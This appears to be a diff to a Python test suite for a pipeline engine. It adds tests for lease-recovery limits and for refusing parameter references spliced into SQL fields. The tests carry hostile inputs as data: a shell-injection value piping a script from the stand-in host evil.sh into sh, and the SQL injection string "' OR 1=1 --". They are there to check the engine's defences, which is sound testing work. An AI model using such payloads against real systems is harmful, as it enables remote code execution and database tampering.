@@ -1883,6 +1883,28 @@ async def test_an_expired_lease_with_no_handle_requeues_the_attempt(
     assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
 
 
+async def test_an_attempt_taken_back_past_the_limit_fails_instead_of_running_again(
+    engine: Engine, sessions: Any, services: EngineServices
+) -> None:
+    definition = PipelineDefinition(code="poisoned", steps=steps(only=StepDefinition(block="test.echo")))
+    run = await start(sessions, services, definition)
+    later = _after_lease(services)
+
+    for _ in range(services.settings.lease_recovery_limit + 1):
+        unit = await engine.claim(now=later)
+        assert unit is not None, "each recovery within the limit runs the step again"
+        later += services.settings.lease * 2
+        async with session_scope(sessions) as session:
+            assert await sweep_leases(session, now=later) == [unit.attempt_id]
+
+    assert await engine.claim(now=later) is None
+    [attempt] = await attempts_of(sessions, run.id)
+    assert attempt.status is AttemptStatus.FAILED
+    assert attempt.error_code == "run.lease_recoveries"
+    assert attempt.error_class == "rejected"
+    assert (await reload(sessions, run.id)).status is RunStatus.FAILED
+
+
 async def test_an_expired_lease_with_a_recorded_handle_resumes_probing(
     engine: Engine, sessions: Any, services: EngineServices
 ) -> None:
@@ -2191,6 +2213,25 @@ async def test_a_value_interpolated_into_a_shell_field_reaches_the_block_as_a_va
         "command": 'load "$DIRIGENT_V0"',
         "variables": {"DIRIGENT_V0": "x; curl evil.sh | sh"},
     }
+
+
+async def test_a_reference_in_a_field_a_block_publishes_as_sql_is_refused_when_the_step_starts(
+    engine: Engine, sessions: Any, services: EngineServices
+) -> None:
+    definition = PipelineDefinition(
+        code="spliced",
+        steps=steps(
+            only=StepDefinition(block="test.sqlish", config={"sql": "SELECT '${params.region}'"}, retry=FAST_RETRY)
+        ),
+    )
+    run = await start(sessions, services, definition, region="' OR 1=1 --")
+    await drain(engine)
+    attempts = await attempts_of(sessions, run.id)
+    assert len(attempts) == 1
+    assert attempts[0].status is AttemptStatus.FAILED
+    assert attempts[0].error_class == ErrorClass.REJECTED.value
+    assert "a value reaches SQL only as a bound parameter" in (attempts[0].error or "")
+    assert attempts[0].output is None
 
 
 async def test_a_manual_retry_is_keyed_on_the_step_it_retries(
